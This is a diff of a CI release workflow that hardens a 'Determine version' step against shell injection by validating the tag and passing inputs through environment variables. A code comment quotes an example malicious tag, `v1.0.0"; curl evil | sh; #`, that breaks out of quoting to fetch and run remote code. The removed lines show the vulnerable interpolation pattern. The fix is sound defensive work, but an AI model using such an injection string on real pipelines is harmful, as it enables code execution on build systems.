@@ -63,14 +63,31 @@ jobs:
           fi
         shell: bash
 
+      - name: Validate release tag
+        # Route inputs.tag through env + format regex before any
+        # downstream step interpolates the version into a shell body.
+        # Without this, a `workflow_dispatch` tag like
+        # `v1.0.0"; curl evil | sh; #` would break out of the
+        # `echo "version=..."` shell quoting in "Determine version".
+        # See #1797.
+        uses: ./.github/actions/validate-release-tag
+        with:
+          tag: ${{ inputs.tag || github.ref_name }}
+
       - name: Determine version
         id: version
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_TAG: ${{ inputs.tag }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "version=${{ inputs.tag }}" >> "$GITHUB_OUTPUT"
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="$INPUT_TAG"
           else
-            echo "version=${GITHUB_REF_NAME}" >> "$GITHUB_OUTPUT"
+            VERSION="$REF_NAME"
           fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
         shell: bash
 
       - name: Package (Unix)
@@ -123,14 +140,26 @@ jobs:
         with:
           path: artifacts
 
+      - name: Validate release tag
+        # See rationale at the corresponding step in the `build` job.
+        uses: ./.github/actions/validate-release-tag
+        with:
+          tag: ${{ inputs.tag || github.ref_name }}
+
       - name: Determine version
         id: version
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          INPUT_TAG: ${{ inputs.tag }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            echo "version=${{ inputs.tag }}" >> "$GITHUB_OUTPUT"
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="$INPUT_TAG"
           else
-            echo "version=${GITHUB_REF_NAME}" >> "$GITHUB_OUTPUT"
+            VERSION="$REF_NAME"
           fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
 
       - name: Generate checksums
         run: |
